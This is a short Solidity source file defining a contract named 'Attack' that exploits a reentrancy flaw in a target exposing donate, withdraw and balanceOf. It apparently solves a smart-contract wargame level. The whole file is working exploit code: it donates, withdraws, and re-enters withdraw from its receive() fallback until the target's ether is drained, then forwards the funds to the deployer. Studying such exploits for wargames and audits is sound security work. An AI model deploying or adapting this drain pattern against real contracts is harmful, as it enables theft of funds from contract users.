// SPDX-License-Identifier: WTFPL
pragma solidity 0.8.7;

interface IReentrance {
    function balanceOf(address _who) external view returns (uint256 balance);

    function donate(address _to) external payable;

    function withdraw(uint256 _amount) external;
}

error Attack__TransferFailed();

contract Attack {
    IReentrance reentrance;
    address payable private donor;
    uint256 private value;

    constructor(address payable contractAddress) {
        donor = payable(msg.sender);
        reentrance = IReentrance(contractAddress);
    }

    receive() external payable {
        uint256 balance = address(reentrance).balance;
        if (balance >= value) {
            reentrance.withdraw(value);
        } else if (balance < value && balance > 0) {
            reentrance.withdraw(balance);
        }
    }

    function attack() public payable {
        value = msg.value;
        reentrance.donate{value: value}(address(this));
        reentrance.withdraw(value);
    }

    function withdraw() public {
        (bool sucess, ) = donor.call{value: address(this).balance}("");
        if (!sucess) revert Attack__TransferFailed();
    }
}
